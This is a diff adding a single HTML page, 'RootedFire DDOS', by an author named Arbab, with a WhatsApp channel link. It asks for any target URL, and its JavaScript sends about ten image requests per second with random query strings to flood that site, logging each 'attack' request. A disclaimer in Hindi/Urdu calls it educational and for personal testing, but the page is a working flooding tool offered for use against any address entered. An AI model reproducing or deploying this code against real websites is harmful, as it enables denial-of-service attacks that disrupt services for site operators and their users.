@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>🔥 RootedFire DDOS (Educational Test) 🔥</title>
+  <style>
+    body { background: black; color: #00ff00; font-family: monospace; padding: 20px; }
+    h1 { color: #0f0; }
+    #console { background: #111; border: 1px solid #0f0; padding: 15px; height: 400px; overflow-y: auto; }
+    input { background: #000; color: #0f0; border: 1px solid #0f0; padding: 5px; width: 300px; }
+    button { background: #0f0; color: black; font-weight: bold; border: none; padding: 5px 10px; margin: 5px; cursor: pointer; border-radius: 4px; }
+    .footer { margin-top: 20px; text-align: center; color: #0f0; font-size: 14px; }
+    .danger { color: red; }
+    .link { color: cyan; font-weight: bold; text-decoration: none; }
+    .link:hover { text-decoration: underline; }
+  </style>
+</head>
+<body>
+  <h1>🔥 RootedFire DDOS (Educational Real Test) 🔥</h1>
+  <p>⚡ For <span class="danger">educational & personal testing only!</span></p>
+
+  <p>Enter your target site (apni website only):</p>
+  <input type="text" id="target" placeholder="https://example.com">
+  <br>
+  <button onclick="startAttack()">🚀 Start Attack</button>
+  <button onclick="stopAttack()">🛑 Stop Attack</button>
+
+  <div id="console"></div>
+
+  <div class="footer">
+    <p>Created by <b>Arbab</b> ⚡</p>
+    <p><a class="link" href="https://whatsapp.com/channel/0029Vb3sqQ4A89Mfr4nu351Y" target="_blank">📢 Join our WhatsApp Channel</a></p>
+    <p class="danger"><b>Disclaimer:</b> Ye tool sirf <u>educational aur personal testing</u> ke liye hai.  
+    Kisi bhi illegal activity ki zimmedari aapki hogi.</p>
+  </div>
+
+  <script>
+    let running = false;
+    let requests = 0;
+    let floodInterval;
+
+    function logMessage(msg) {
+      const consoleBox = document.getElementById("console");
+      consoleBox.innerHTML += msg + "<br>";
+      consoleBox.scrollTop = consoleBox.scrollHeight;
+    }
+
+    function startAttack() {
+      if (running) return;
+      const target = document.getElementById("target").value;
+      if (!target) {
+        alert("Enter a target URL first!");
+        return;
+      }
+      running = true;
+      logMessage("🚀 Starting attack on: " + target);
+
+      floodInterval = setInterval(() => {
+        requests++;
+        const img = new Image();
+        img.src = target + "?req=" + Math.random();
+        logMessage("[ATTACK] Sent request #" + requests + " → " + target);
+      }, 100); // ~10 requests/sec
+    }
+
+    function stopAttack() {
+      if (!running) return;
+      clearInterval(floodInterval);
+      running = false;
+      logMessage("🛑 Attack stopped after " + requests + " requests.");
+    }
+  </script>
+</body>
+</html>
